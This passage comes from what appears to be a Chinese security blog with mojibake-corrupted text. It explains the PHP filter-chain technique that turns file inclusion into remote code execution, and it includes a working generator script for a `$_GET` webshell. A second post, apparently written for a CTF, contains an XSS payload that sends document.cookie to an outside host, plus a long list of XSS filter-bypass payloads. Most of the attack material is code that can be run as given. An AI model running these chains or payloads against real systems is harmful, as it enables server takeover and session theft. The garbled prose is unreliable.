ï¼ŒCä¹Ÿä¼šè¢«å’Œaä¸€èµ·ç¼–ç ã€‚å¯¼è‡´æœ€ç»ˆç»“æœå‡ºé”™ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆç»è¿‡ä¸€ä¸ªbase64ç¼–ç ï¼Œç„¶åå†è§£ç ï¼Œå› ä¸ºç¼–ç ä»¥åï¼Œåƒåœ¾å­—ç¬¦å·²ç»è¢«å»æ‰äº†ï¼Œå°±åªå‰©ä¸‹Cå’Œaï¼Œåœ¨è§£ç ä»¥åä»¥åï¼Œå°±æ˜¯å®Œæ•´çš„æ­£ç¡®æ•°æ®äº†ã€‚ $url = &quot;php://filter/&quot;;$url .= &quot;convert.iconv.UTF8.CSISO2022KR&quot;;$url .= &quot;|convert.base64-decode&quot;;$url .= &quot;/resource=data://,aaaaaaaaaaaaaa&quot;;var_dump(file_get_contents($url));// hexdump// 00000000 73 74 72 69 6e 67 28 31 31 29 20 22 09 a6 9a 69 |string(11) &quot;...i|// 00000010 a6 9a 69 a6 9a 69 a6 22 0a |..i..i.&quot;.|$url = &quot;php://filter/&quot;;$url .= &quot;convert.iconv.UTF8.CSISO2022KR&quot;;$url .= &quot;|convert.base64-decode|convert.base64-encode&quot;;$url .= &quot;/resource=data://,aaaaaaaaaaaaaa&quot;;var_dump(file_get_contents($url));// hexdump// 00000000 73 74 72 69 6e 67 28 31 32 29 20 22 43 61 61 61 |string(12) &quot;Caaa|// 00000010 61 61 61 61 61 61 61 61 22 0a |aaaaaaaa&quot;.| Craft Base64 Payloadé‚£æˆ‘ä»¬åº”è¯¥æ€ä¹ˆæ„é€ éœ€è¦çš„å†…å®¹å‘¢ï¼Ÿå› ä¸º base64 ç¼–ç åˆæ³•å­—ç¬¦é‡Œé¢å¹¶æ²¡æœ‰å°–æ‹¬å·ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½é€šè¿‡ä»¥ä¸Šæ–¹å¼ç›´æ¥äº§ç”Ÿ PHP ä»£ç è¿›è¡ŒåŒ…å«ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸ŠæŠ€å·§æ¥äº§ç”Ÿä¸€ä¸ª base64 å­—ç¬¦ä¸²ï¼Œæœ€åå†ä½¿ç”¨ä¸€æ¬¡ base64 è§£ç ä¸€æ¬¡å°±å¯ä»¥äº†ã€‚ ä¾‹å¦‚æˆ‘ä»¬ç”Ÿæˆ PAaaaaa ï¼Œæœ€åç»è¿‡ base64 è§£ç å¾—åˆ°ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸º &lt; ï¼Œåç»­ä¸ºå…¶ä»–ä¸éœ€è¦çš„å­—ç¬¦ï¼ˆæˆ‘ä»¬è¿™é‡Œä¸éœ€è¦çš„å­—ç¬¦ç§°ä¸ºåƒåœ¾å­—ç¬¦ï¼‰çš„å­—ç¬¦ä¸²ã€‚ æ‰€ä»¥æˆ‘ä»¬æ¥ä¸‹æ¥éœ€è¦åšçš„ï¼Œå°±æ˜¯åˆ©ç”¨ä»¥ä¸ŠæŠ€å·§æ‰¾åˆ°è¿™ä¹ˆä¸€ç±»ç¼–ç ï¼Œå¯ä»¥åªå­˜åœ¨æˆ‘ä»¬éœ€è¦çš„æ„é€ ä¸€ä¸ª webshell çš„ base64 å­—ç¬¦ä¸²äº†ã€‚ æˆ‘ä»¬å…ˆçœ‹ä½œè€…ä½¿ç”¨çš„å‡ ä¸ªç¤ºä¾‹ï¼Œä¾‹å¦‚å­—ç¬¦ 8 ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2 æ¥ç”Ÿæˆ $url = &quot;php://filter/&quot;;$url = $url.&quot;convert.iconv.UTF8.CSISO2022KR&quot;;$url = $url.&quot;|convert.base64-decode|convert.base64-encode|&quot;;$url .= &quot;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&quot;;// $url = $url.&quot;|convert.base64-decode|convert.base64-encode&quot;;$url .= &quot;/resource=data://,aaaaaaaaaaaaaa&quot;;var_dump(file_get_contents($url));// hexdump// 00000000 73 74 72 69 6e 67 28 35 32 29 20 22 38 01 fe 00 |string(52) &quot;8...|// 00000010 43 00 00 00 61 00 00 00 61 00 00 00 61 00 00 00 |C...a...a...a...|// 00000020 61 00 00 00 61 00 00 00 61 00 00 00 61 00 00 00 |a...a...a...a...|// *// 00000040 22 0a |&quot;.|// èµ·ç”¨äº†æ³¨é‡Šé‚£ä¸€è¡Œåï¼Œå³è¿˜åŸåˆ° Base64 ä¹‹åçš„ hexdump:// 00000000 73 74 72 69 6e 67 28 31 32 29 20 22 38 43 61 61 |string(12) &quot;8Caa|// 00000010 61 61 61 61 61 61 61 61 22 0a |aaaaaaaa&quot;.| æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ç§å½¢å¼æ¥å°†å‰é¢éƒ¨åˆ†çš„æ„é€ æˆæˆ‘ä»¬æ‰€éœ€è¦çš„ base64 å­—ç¬¦ä¸²ï¼Œæœ€å base64 è§£ç å³å¯æˆä¸ºæˆ‘ä»¬æƒ³è¦çš„ PHP ä»£ç äº†ã€‚ éš¾ç‚¹æ€è€ƒçœ‹åˆ°è¿™é‡Œå…¶å®æœ‰ä¸€äº›ï¼Œè¿˜æ˜¯ä¸æ˜¯ç‰¹åˆ«æ‡‚å¦‚ä½•åˆ©ç”¨è¿™äº›ç¼–ç æ¥æ„é€ å‡ºå­—ç¬¦ å¯ä»¥çœ‹åˆ°ï¼Œæ˜¯åˆ©ç”¨iconvçš„ä¸€ä¸ªè½¬ç ï¼Œä½¿å¾—åŸæœ¬çš„æ–‡æœ¬åœ¨ç»è¿‡è½¬ç ä»¥åï¼Œç”Ÿå‡ºäº†å…¶ä»–å­—ç¬¦ï¼Œä»è€Œè·å¾—æˆ‘ä»¬æ‰€éœ€è¦çš„å­—ç¬¦ï¼Œå¯ä»¥çœ‹åˆ°å·¦è¾¹çš„s8Cå°±æ˜¯æˆ‘ä»¬ä½¿ç”¨ä¸‰ç§å­—ç¬¦ä¸²ç¼–ç çš„è½¬ç ä»¥åæ‰€å¾—åˆ°çš„å†…å®¹ã€‚æ ¹æ®è¿™ä¸ªç‰¹æ€§ï¼Œæˆ‘ä»¬å°±å¯ä»¥éå†iconvè·å¾—æˆ‘ä»¬éœ€è¦çš„æ‰€æœ‰å­—ç¬¦ RCEå› ä¸ºæœ€ç»ˆçš„ base64 å­—ç¬¦ä¸²ï¼Œæ˜¯ç”± iconv ç›¸å¯¹åº”çš„ç¼–ç è§„åˆ™ç”Ÿæˆçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æœ€å¥½é€šè¿‡å·²æœ‰çš„ç¼–ç è§„åˆ™æ¥é€‚å½“åœ°åŒ¹é…è‡ªå·±æƒ³è¦çš„ webshell ï¼Œæ¯”å¦‚ &lt;?=`$_GET[0]`;;?&gt;#base64_encode:PD89YCRfR0VUWzBdYDs7Pz4= æ¥ä¸‹æ¥å°±æ˜¯ä½¿ç”¨å­—ç¬¦é›†è·å¾—è¿™ä¸€ä¸²å­—ç¬¦ æˆ‘ç›´æ¥ä½¿ç”¨ç½‘ä¸Šçš„è„šæœ¬å‘ç°åœ¨På’Œfçš„è½¬åŒ–æ˜¯å¤±è´¥çš„ï¼Œæ‰¾ä¸åˆ°è¿™ä¸ªå­—ç¬¦é›† æˆ‘å°±æŸ¥äº†ä¸€ä¸‹ï¼Œå‘ç°å…¶ä¸­æœ‰ä¸€ä¸ªå­—ç¬¦é›†çš„å†™æ³•ä¼¼ä¹ä¼šéšç‰ˆæœ¬å˜åŒ–è€Œæ”¹å˜ï¼Œæ¢äº†ä¸€ä¸‹å‘ç°å°±æˆåŠŸäº† shift_jisx0213ã€shiftjisx0213å°±æ˜¯è¿™ä¸¤ä¸ªæ¢ä¸€ä¸‹ï¼Œå°±è¡Œäº†ï¼Œæ¥ä¸‹æ¥ç»è¿‡è„šæœ¬çš„è§£ç å°±å¯ä»¥å¾—åˆ° è´´ä¸€ä¸‹è„šæœ¬ &lt;?php$base64_payload = &quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;;$conversions = array( 'R' =&gt; 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2', 'B' =&gt; 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2', 'C' =&gt; 'convert.iconv.UTF8.CSISO2022KR', '8' =&gt; 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2', '9' =&gt; 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB', 'f' =&gt; 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFT_JISX0213', 's' =&gt; 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61', 'z' =&gt; 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS', 'U' =&gt; 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932', 'P' =&gt; 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFT_JISX0213', 'V' =&gt; 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5', '0' =&gt; 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2', 'Y' =&gt; 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2', 'W' =&gt; 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2', 'd' =&gt; 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2', 'D' =&gt; 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2', '7' =&gt; 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2', '4' =&gt; 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2');$filters = &quot;convert.base64-encode|&quot;;# make sure to get rid of any equal signs in both the string we just generated and the rest of the file$filters .= &quot;convert.iconv.UTF8.UTF7|&quot;;foreach (str_split(strrev($base64_payload)) as $c) { $filters .= $conversions[$c] . &quot;|&quot;; $filters .= &quot;convert.base64-decode|&quot;; $filters .= &quot;convert.base64-encode|&quot;; $filters .= &quot;convert.iconv.UTF8.UTF7|&quot;;}$filters .= &quot;convert.base64-decode&quot;;$final_payload = &quot;php://filter/{$filters}/resource=data://,aaaaaaaaaaaaaaaaaaaa&quot;;// echo $final_payload;var_dump(file_get_contents($final_payload)); è¿™é‡Œæœ‰å‡ ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯ 1.convert.iconv.UTF8.UTF7 å°†ç­‰å·è½¬æ¢ä¸ºå­—æ¯ã€‚ä¹‹æ‰€ä»¥ä½¿ç”¨è¿™ä¸ªçš„åŸå› æ˜¯ exp ä½œè€…é‡åˆ°è¿‡æœ‰æ—¶å€™ç­‰å·ä¼šè®© convert.base64-decode è¿‡æ»¤å™¨è§£æå¤±è´¥çš„æƒ…å†µï¼Œå¯ä»¥ä½¿ç”¨ iconv ä» UTF8 è½¬æ¢åˆ° UTF7 ï¼Œä¼šæŠŠå­—ç¬¦ä¸²ä¸­çš„ä»»ä½•ç­‰å·å˜æˆä¸€äº› base64 ã€‚ä½†æ˜¯å®é™…æµ‹è¯•è²Œä¼¼æˆ‘é‡åˆ°çš„æƒ…å†µå¹¶æ²¡æœ‰æŠ›å‡º Error ï¼Œæœ€å·®æƒ…å†µæŠ›å‡ºäº† warning ä½†ä¸æ˜¯ç‰¹åˆ«å½±å“ï¼Œä½†æ˜¯ä¸ºäº†é¿å…å¥‡æ€ªçš„é”™è¯¯ï¼Œè¿˜æ˜¯åŠ ä¸Šä¸ºå¥½ã€‚2.data://,åçš„æ•°æ®æ˜¯ä¸ºäº†æ–¹ä¾¿å±•ç¤ºï¼Œéœ€è¦è¡¥è¶³ä¸€å®šçš„ä½æ•°ï¼Œï¼ˆè¿™é‡Œè¦åŒ…å«ä»»ä½•æ–‡ä»¶éƒ½å¯ä»¥ï¼Œä½†æ˜¯éœ€è¦åŒ…å«ä¸€ä¸ªæ–‡ä»¶ï¼Œè®©å­—ç¬¦é›†æœ‰æ–½å±•çš„ç©ºé—´ï¼‰ fuzzå­—ç¬¦é›†çš„å¯»æ‰¾æ˜¯å¾ˆå…³é”®çš„ï¼Œä¸Šé¢æ˜¯å‡‘å·§ä¸¤ä¸ªå­—ç¬¦é›†æ¢ä¸€ä¸‹å°±å¯ä»¥å¾—åˆ°ç»“æœï¼Œè€Œå¦‚æœè¦å¯»æ‰¾å…¶ä»–å­—ç¬¦é›†ï¼Œæ²¡æœ‰ä¸€å®šçš„æŠ€å·§ä¹Ÿæ˜¯å¾ˆéš¾æ‰¾åˆ°çš„ã€‚ å‡è®¾æˆ‘ä»¬éœ€è¦å¯»æ‰¾çš„å­—ç¬¦ä¸ºx xå¿…é¡»åœ¨æœ€ç»ˆç”Ÿæˆçš„å­—ç¬¦ä¸²çš„å‰æ®µï¼ˆä¾¿äºæ’åºä½ç½®ï¼‰ å­—ç¬¦ä¸²çš„å‰ç«¯çš„å­—ç¬¦å½“ä¸­ï¼Œæœ€å¥½çš„æƒ…å†µæ˜¯åªå­˜åœ¨å”¯ä¸€ä¸€ä¸ªxå¯¹PHP base64æ¥è¯´åˆæ³•çš„å­—ç¬¦ã€‚ å¦‚æœæ²¡åŠæ³•æ‰¾åˆ°å•ä¸ªå­—ç¬¦ï¼Œå¯ä»¥ç”¨å¤šä¸ªå­—ç¬¦æ¥åˆå¹¶ç”Ÿæˆï¼Œä¾‹å­å¦‚ä¸‹ï¼š é¦–å…ˆï¼Œä½¿ç”¨iconv -lå¯ä»¥è·å¾—æ‰€æœ‰çš„å­—ç¬¦é›† ä»¥ç”Ÿæˆ8çš„å­—ç¬¦é›†ä¸ºä¾‹ï¼Œé€šè¿‡ä¸æ–­çš„æ‹¼æ¥æ–°çš„å­—ç¬¦é›†å°±å¯ä»¥äº§ç”Ÿäº† $url = &quot;php://filter/convert.iconv.UTF8.UTF7|&quot;;$url .= &quot;convert.iconv.UTF8.CSISO2022KR&quot;;$url = $url.&quot;/resource=data://,aaaaaaaaaaaaaaaa&quot;;var_dump(file_get_contents($url));$url = &quot;php://filter/convert.iconv.UTF8.UTF7|&quot;;$url .= &quot;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16&quot;;$url = $url.&quot;/resource=data://,aaaaaaaaaaaaaaaa&quot;;var_dump(file_get_contents($url));$url = &quot;php://filter/convert.iconv.UTF8.UTF7|&quot;;$url .= &quot;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&quot;;$url = $url.&quot;/resource=data://,aaaaaaaaaaaaaaaa&quot;;var_dump(file_get_contents($url)); å·²ç»æœ‰å¸ˆå‚…å°†åŸºæœ¬ä¸Šæ‰€æœ‰çš„å­—ç¬¦éƒ½fuzzå‡ºæ¥äº† wupcoï¼šhttps://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT garbage stringå¦‚æœæ‰¾ä¸åˆ°å¯ç”¨æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨convert.iconv.UTF8.CSISO2022KRå­—ç¬¦é›†ï¼Œå› ä¸ºä»–æ€»æ˜¯ä¼šåœ¨å­—ç¬¦ä¸²å‰é¢ç”Ÿæˆ\\x1b$)C ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥äº§ç”Ÿè¶³å¤Ÿçš„åƒåœ¾æ•°æ®ä¾›æˆ‘ä»¬æ„é€  Payload ï¼Œä»¥ä¸‹ç”¨ä¸€ä¸ªç©ºæ–‡ä»¶ç”Ÿæˆä¸€ä¸ª 8 æ¥æµ‹è¯• $url = &quot;php://filter/&quot;;$url .= &quot;convert.iconv.UTF8.CSISO2022KR|&quot;;$url .= &quot;convert.base64-encode|&quot;;$url .= &quot;convert.iconv.UTF8.UTF7|&quot;;// 8$url .= &quot;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&quot;;$url = $url.&quot;|convert.base64-decode|convert.base64-encode&quot;;$url = $url.&quot;/resource=./e&quot;;var_dump(file_get_contents($url));","link":"/2022/01/17/the-end-of-LFI/"},{"title":"xssç»„åˆå¯å‘","text":"xsså…¥é—¨åœ¨è¿™é‡Œå°±è¯´è¯´ä»ä¸€é“ctfçš„xssé¢˜ç›®ä»¥åŠåœ¨åšè¿™ä¸ªé¢˜ç›®çš„æ—¶å€™æ‰€é‡åˆ°çš„ä¸€äº›çŸ¥è¯†è¿˜æœ‰æƒ³æ³•â€™â€™ &lt;script&gt;window.open('http://de28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn/?'+document.cookie);&lt;/script&gt; &lt;img src=&quot;x&quot; onerror=&quot;this.alt=document.getElementsByTagName('script')[0].innerHTML&quot;/&gt; é€‰æ‹©åˆé€‚çš„xssè¯­å¥é¦–å…ˆæˆ‘ä»¬éœ€è¦è§‚å¯Ÿï¼Œxssä»ä½•æ’å…¥ï¼Œæ’å…¥ä»¥åæˆ‘ä»¬æ˜¯å¦å¯ä»¥ç‚¹å‡» &lt;scri&lt;script&gt;pt&gt;alert(1)&lt;/scri&lt;/script&gt;pt&gt;&lt;!--å‡åœ¨chromeæµ‹è¯•--&gt;&lt;!--style onreadystatechange=alert(0)--&gt;&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;!--alert(1)--&gt;&lt;!--xml onreadystatechange=alert(2)--&gt;&lt;!--object data=&quot;data:text/html,&lt;script&gt;alert(3)&lt;/script&gt;&quot;--&gt;&lt;Img src=&quot;&quot; onerror=&quot;alert(4)&quot;/&gt;&lt;img src=&quot;&quot; onerror=&quot;alert(5)&quot;/&gt;&lt;img src=&quot;&quot; onerror=&quot;javascript:alert(6)&quot;/&gt;&lt;[%00] img onerror=alert(10) src=a&gt;&lt;!--ä¸æ‰§è¡Œ--&gt;&lt;i[%00]mg onerror=alert(11) src=a&gt;&lt;!--ä¸æ‰§è¡Œ--&gt;&lt;img/onerror=alert(12) src=a&gt;&lt;img [%09] onerror=alert(13) src=a&gt;&lt;img/&quot; onerror=alert(14) src=a&gt;&lt;img/onerror=alert(140) src=a&gt;&lt;img/anyjunk/onerror=alert(15) src=a&gt;&lt;img o[%00]nerror=alert(16) src=a&gt;&lt;!--ä¸æ‰§è¡Œ--&gt;&lt;script/anyjunk&gt;alert(17)&lt;/script&gt;&lt;body onbeforeactivate=alert(18)&gt;&lt;!--iframe onreadystatechange=alert(19)--&gt;&lt;object onerror=alert(20)&gt;&lt;!--ä¸æ‰§è¡Œ--&gt;&lt;!--input autofocus onfocus=alert(21)--&gt;&lt;a&gt;here here&lt;/a onmousemove=alert(22)&gt;&lt;!--ä¸æ‰§è¡Œ--&gt;&lt;video src=1 onerror=alert(23)&gt;&lt;embed src=javascript:alert(24)&gt;&lt;!--ä¸æ‰§è¡Œ--&gt;&lt;x style=behavior:url(#default#time2) onbegin=alert(25)&gt; &lt;!--ä¸æ‰§è¡Œ--&gt;&lt;img onerror=&quot;alert(25)&quot;src=a&gt;&lt;img onerror='alert(26)'src=a&gt;&lt;img onerror=`alert(27)`src=a&gt;&lt;!--chormeä¸æ‰§è¡Œ--&gt;&lt;img/onerror=&quot;alert(28)&quot;src=a&gt;&lt;&lt;img onerror=alert(29) src=a&gt;&gt;%253cimg%20onerror=alert(30)%20src=a%253eï¼Œé¦–å…ˆè¢«è¿‡æ»¤å™¨è§£ç %3cimg onerror=alert(31) src=a%3eï¼Œåå¤‡æµè§ˆå™¨è§£ç ä¸º&lt;img onerror=alert(30) src=a&gt;&lt;img onerror=a&amp;#x0006c;ert(31) src=a&gt;ä½¿ç”¨åè¿›åˆ¶æˆ–è€…åå…­è¿›åˆ¶ä»£æ›¿htmlç¼–ç ï¼Œå¹¶æ·»åŠ å¤šä¸ªå‰å¯¼0å¹¶çœç•¥ç»“å°¾çš„åˆ†å·&lt;img onerror=a&amp;#0108ert(32) src=a&gt;ä½¿ç”¨åè¿›åˆ¶æˆ–è€…åå…­è¿›åˆ¶ä»£æ›¿htmlç¼–ç ï¼Œå¹¶æ·»åŠ å¤šä¸ªå‰å¯¼0å¹¶çœç•¥ç»“å°¾çš„åˆ†å·&lt;iframe src=j&amp;#x61;vasc&amp;#x72ipt&amp;#x3a;alert&amp;#x28;33&amp;#x29;&gt;&lt;img onerror=a&amp;#x6c;ert(34) src=a&gt;&lt;&lt;script&gt;alert(35);//&lt;&lt;/script&gt;&lt;script&lt;{alert(36)}/&gt;&lt;/script&gt;&lt;!--ä¸æ‰§è¡Œ--&gt;&lt;body onscroll=alert(37)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;....&lt;input autoocus&gt;&lt;input onblur=alert(38) autofocus&gt;&lt;input autofocus&gt;%u00ABimg onerror=alert(39) src=a%u00bbï¼Œunicodeç¼–ç éæ ‡å‡†ç¼–ç é¿å¼€è¿‡æ»¤ï¼ŒUTF-7,US-ASCII,UTF-16ï¼Œå¤šå­—èŠ‚å­—ç¬¦é›†Shift-JIS,EUC-JP,BIG5(æ¡ä»¶æ˜¯æ§åˆ¶Content-typeæˆ–è€…å¯¹åº”çš„htmlå…ƒæ ‡ç­¾ã€charset)///é¿å¼€è¿‡æ»¤ï¼Œè„šæœ¬ä»£ç ï¼š&lt;script&gt;a\\u006cert(40)&lt;/script&gt;;unicode&lt;script&gt;eval('a\\u006cert(41)')&lt;/script&gt;;unicode&lt;script&gt;eval('a\\x6cert(42)')&lt;/script&gt;;16è¿›åˆ¶&lt;script&gt;eval('a\\154ert(43)')&lt;/script&gt;;10è¿›åˆ¶&lt;script&gt;eval('a\\l\\ert\\(44\\)')&lt;/script&gt;;evalä¸­å¤šä½™è½¬ä¹‰è¢«å¿½ç•¥&lt;script&gt;eval('al' +'ert\\(45\\)')&lt;/script&gt;;åŠ¨æ€æ„å»º&lt;script&gt;eval('al' +'ert(46)')&lt;/script&gt;;åŠ¨æ€æ„å»ºå¸¦å¤šä½™è½¬ä¹‰&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41));åŠ¨æ€æ„å»º&lt;/script&gt;;alert(1)&lt;script&gt;eval(atob('amF2YXNjcmlwdDphbGVydCgxKQ'));&lt;/script&gt;;åŠ¨æ€æ„å»º&lt;/script&gt;;alert(1)&lt;script&gt;'alert(49)'.replace(/.+/,eval)&lt;/script&gt;;æ— æ³•ç›´æ¥ä½¿ç”¨evalçš„æƒ…å†µ&lt;script&gt;function::['alert'](50)&lt;/script&gt;;æ— æ³•ç›´æ¥ä½¿ç”¨evalçš„æƒ…å†µ&lt;script&gt;alert(document['cookie'])&lt;/script&gt;;æ›¿ä»£åœ†ç‚¹&lt;script&gt;with(document)alert(cookie)&lt;/script&gt;;æ›¿ä»£åœ†ç‚¹ ä»¥ä¸Šå±•ç¤ºçš„å‡ä¸ºæ‰§è¡Œè„šæœ¬çš„æƒ…å†µï¼Œå¦‚æœscriptè¢«è¿‡æ»¤äº†ï¼Œé‚£ä¹ˆå°±åªèƒ½ä½¿ç”¨å…¶ä»–æ ‡ç­¾ï¼Œå¹¶é€‰æ‹©ä½¿ç”¨javascriptæ¥æ‰§è¡Œå¹¶è¾“å‡ºè¿›è¡Œæ›¿ä»£ è§¦å‘äº‹ä»¶1ã€onmouseenterï¼šå½“é¼ æ ‡è¿›å…¥é€‰åŒºæ‰§è¡Œä»£ç 2ã€onmouseleaveï¼šå½“é¼ æ ‡ç¦»å¼€é€‰åŒºæ‰§è¡Œä»£ç 3ã€onmousewheelï¼šå½“é¼ æ ‡åœ¨é€‰åŒºæ»šè½®æ—¶æ‰§è¡Œä»£ç 4ã€onscrollï¼šæ‹–åŠ¨æ»šåŠ¨æ¡æ‰§è¡Œä»£ç 5ã€onfocusinï¼šå½“è·å¾—ç„¦ç‚¹æ—¶æ‰§è¡Œä»£ç 6ã€onfocusoutï¼šå½“å¤±å»ç„¦ç‚¹æ—¶æ‰§è¡Œä»£ç 7ã€onstartï¼šå½“æ˜¾ç¤ºå†…å®¹æ—¶æ‰§è¡Œä»£ç 8ã€onbeforecopyï¼šé€‰ä¸­å†…å®¹åå³é”®æ‰§è¡Œä»£ç 9ã€onbeforecutï¼šé€‰ä¸­å†…å®¹åå³é”®æ‰§è¡Œä»£ç 10ã€onbeforeeditfocusï¼šå½“è·å¾—ç„¦ç‚¹æ—¶æ‰§è¡Œä»£ç 11ã€onbeforepasteï¼šé€‰ä¸­å†…å®¹åå³é”®æ‰§è¡Œä»£ç 12ã€oncontextmenuï¼šé¼ æ ‡å³é”®æ‰§è¡Œä»£ç 13ã€oncopyï¼šé¼ æ ‡å³é”®æ‰§è¡Œå¤åˆ¶æ—¶æ‰§è¡Œä»£ç 14ã€oncutï¼šé¼ æ ‡å³é”®æ‰§è¡Œå‰ªåˆ‡æ—¶æ‰§è¡Œä»£ç 15ã€ondragï¼šé€‰æ‹©å†…å®¹å¹¶æ‹–åŠ¨æ—¶æ‰§è¡Œä»£ç 16ã€ondragendï¼šé€‰æ‹©å†…å®¹å¹¶æ‹–åŠ¨æ¾å¼€é¼ æ ‡æ‰§è¡Œä»£ç 17ã€ondragenterï¼šé€‰æ‹©å†…å®¹å¹¶æ‹–åŠ¨æ—¶æ‰§è¡Œä»£ç 18ã€ondragleaveï¼šé€‰æ‹©å†…å®¹å¹¶æ‹–å‡ºè¾¹æ¡†æ‰§è¡Œä»£ç 19ã€ondragoverï¼šé€‰æ‹©å†…å®¹å¹¶æ‹–åŠ¨æ—¶æ‰§è¡Œä»£ç 20ã€ondragstartï¼šé€‰æ‹©å†…å®¹å¹¶æ‹–åŠ¨æ—¶æ‰§è¡Œä»£ç 21ã€ondropï¼šæœ‰å†…å®¹è¢«æ‹–åŠ¨è¿›æ¥æ—¶æ‰§è¡Œä»£ç 22ã€onlosecaptureï¼šé€‰æ‹©å†…å®¹æ—¶æ‰§è¡Œä»£ç 23ã€onpasteï¼šç²˜è´´æ—¶æ‰§è¡Œä»£ç 24ã€onselectstartï¼šé€‰æ‹©å†…å®¹æ—¶æ‰§è¡Œä»£ç 25ã€onhelpï¼šè¿›å…¥ç„¦ç‚¹æŒ‰F1æ—¶æ‰§è¡Œä»£ç 26ã€onEndï¼šå½“æ—¶é—´çº¿æ‰§è¡Œå®Œæ¯•æ—¶æ‰§è¡Œä»£ç 27ã€onBeginï¼šå½“æ—¶é—´çº¿å¼€å§‹æ‰§è¡Œä»£ç 28ã€onactivateï¼šæ¿€æ´»å½“å‰æ ‡ç­¾æ—¶æ‰§è¡Œä»£ç 29ã€onfilterchangeï¼šå½“æ»¤é•œæ”¹å˜æ—¶æ‰§è¡Œä»£ç 30ã€onbeforeactivateï¼šå½“æ¿€æ´»å½“å‰æ ‡ç­¾æ—¶æ‰§è¡Œä»£ç 31ã€onbeforedeactivateï¼šå½“æ ‡ç­¾å†…å€¼æ”¹å˜æ—¶æ‰§è¡Œä»£ç 32ã€ondeactivateï¼šå½“æ ‡ç­¾å†…å€¼æ”¹å˜æ—¶æ‰§è¡Œä»£ç 33ã€onerror:åŠ è½½é”™è¯¯æ—¶è§¦å‘ åœ¨xssä¸­ï¼Œå¦‚æœscriptè¢«è¿‡æ»¤ï¼Œ æ— æ³•ç›´æ¥æ‰§è¡Œå‡ºç»“æœæ—¶ï¼Œè¿™ä¸ªæ—¶å€™å°±è¦ä½¿ç”¨å…¶ä»–ç»„åˆæ‹³ï¼Œä¹Ÿå°±æ˜¯åˆé€‚çš„æ ‡ç­¾æ­é…åˆé€‚çš„äº‹ä»¶ï¼Œæ¯”å¦‚è¯´æˆ‘ä»¬ä½¿ç”¨imgæ ‡ç­¾æ—¶ï¼Œæˆ‘ä»¬åé¢è¦æ‰§è¡Œçš„æ˜¯ä¸€ä¸ªè„šæœ¬è¯­å¥ï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™ä¸€å®šæ˜¯åŠ 